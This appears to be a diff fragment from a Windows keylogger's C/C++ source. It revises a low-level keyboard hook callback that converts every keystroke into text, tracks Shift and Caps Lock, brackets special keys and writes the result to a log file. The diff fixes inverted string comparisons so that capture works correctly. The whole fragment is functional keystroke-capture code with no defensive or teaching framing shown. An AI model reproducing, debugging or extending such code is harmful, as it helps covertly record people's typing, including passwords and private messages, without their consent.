@@ -31,51 +31,38 @@ LRESULT CALLBACK handleKeysProc(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM 
 
 		msg += (st_hook.scanCode << 16);
 		msg += (st_hook.flags << 24);
-		GetKeyNameText(msg, tmp, 0xFF);
-
-		lstrcpy(str, tmp);		
-
-		printable = (_tcslen(tmp) <= 1) ? true : false;
-		if (_tcscmp(tmp, _T("CAPSLOCK"))) {
+		GetKeyNameText(msg, tmp, 0xFF);		
+		
+		if (_tcscmp(tmp, _T("Caps Lock")) == 0) {
 			capslock = !capslock;
-		}
-		else if (_tcscmp(tmp, _T("SHIFT"))) {
+		} else if (_tcscmp(tmp, _T("Shift")) == 0) {
 			shift = true;
-		}
-		else if (_tcscmp(tmp, _T("ENTER"))) {
-			_tcscpy(str, _T("\n"));
-			printable = true;
-		}
-		else if (_tcscmp(tmp, _T("SPACE"))) {
-			_tcscpy(str, _T(" "));
-			printable = true;
-		}
-		else if (_tcscmp(tmp, _T("TAB"))) {
-			_tcscpy(str, _T("\t"));
-			printable = true;
-		}
-		else {
-			_tcscpy(str, _T("["));
-			_tcscat(str, tmp);
-			_tcscat(str, _T("]"));
-		}
-
-		if (printable) {
-			if (shift == capslock) { /* Lowercase */
-				for (size_t i = 0; i < _tcslen(str); ++i)
-					str[i] = tolower(str[i]);
-			}
-			else { /* Uppercase */
-				for (size_t i = 0; i < _tcslen(str); ++i) {
-					if (str[i] >= 'A' && str[i] <= 'Z') {
-						str[i] = toupper(str[i]);
+		} else {
+			if (_tcslen(tmp) > 1) {
+				lstrcpy(str, _T("["));
+				lstrcat(str, tmp);
+				lstrcat(str, _T("]"));
+			} else {
+				lstrcat(str, tmp);
+				if (shift == capslock) { /* Lowercase */
+					for (size_t i = 0; i < _tcslen(str); ++i)
+						str[i] = tolower(str[i]);
+				} else { /* Uppercase */
+					for (size_t i = 0; i < _tcslen(str); ++i) {
+						if (str[i] >= 'A' && str[i] <= 'Z') {
+							str[i] = toupper(str[i]);
+						}
 					}
 				}
+				shift = false;
 			}
-			shift = false;
-		}
 
-		logFile.Write(str);
+#ifdef _DEBUG	
+			OutputDebugString(str);			
+#endif // DEBUG
+
+			logFile.Write(str);
+		}
 	}
 	return CallNextHookEx(kbdhook, nCode, wParam, lParam);
 }
